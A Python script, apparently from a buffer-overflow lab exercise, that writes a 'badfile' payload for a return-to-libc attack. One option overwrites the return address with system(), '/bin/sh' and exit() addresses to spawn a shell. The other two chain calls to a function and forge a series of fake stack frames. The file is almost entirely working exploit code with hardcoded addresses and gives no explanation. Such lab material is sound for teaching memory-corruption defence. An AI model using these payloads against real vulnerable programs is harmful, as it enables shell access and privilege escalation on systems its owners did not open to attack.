#!/usr/bin/env python3
import sys
#Address of buffer[] inside bof():  0xffffcdb0
#Frame Pointer value inside bof():  0xffffcdc8
# Fill content with non-zero values

def tobytes(value):
    return (value).to_bytes(4,byteorder='little')


option = 3
if option==1:

    content = bytearray(0xaa for i in range(1000))
    X = 36
    sh_addr = 0xffffd447# The address of "/bin/sh"
    content[X:X+4] = tobytes(sh_addr)
    
    Y = 28
    system_addr = 0xf7e12420   # The address of system()
    content[Y:Y+4] = tobytes(system_addr)
    
    Z = 32
    exit_addr = 0xf7e04f80 # The address of exit()
    content[Z:Z+4] = tobytes(exit_addr)
    
    # Save content to a file

elif option==2:
    content = bytearray(0xaa for i in range(24))
    foo_addr = 0x565562d0
    exit_addr = 0xf7e04f80 # The address of exit()
    content+=tobytes(0xFFFFFFFF)
    for i in range(10):
        content+=tobytes(foo_addr)
    content+= tobytes(exit_addr)
    print(len(content))

else:
    content = bytearray(0xaa for i in range(24))
    foo_addr = 0x565562d8
    bof_ebp = 0xffffcdb8 
    bof_addr = 0xFFFFCDC0
    exit_addr = 0xf7e04f80 # The address of exit()
    next_ebp = bof_ebp
    for i in range(10):
        next_ebp += 0x20
        content+= tobytes(next_ebp)
        content+=tobytes(bof_addr)
        content+='dfsfafadfa'.encode()
        content+=b'A' *(0x20-3*4)

    content+=tobytes(0xFFFFFFDD)
    content+= tobytes(exit_addr)
    content+=tobytes(0xAABBCCDD)
    print(len(content))
with open("badfile", "wb") as f:
    f.write(content)
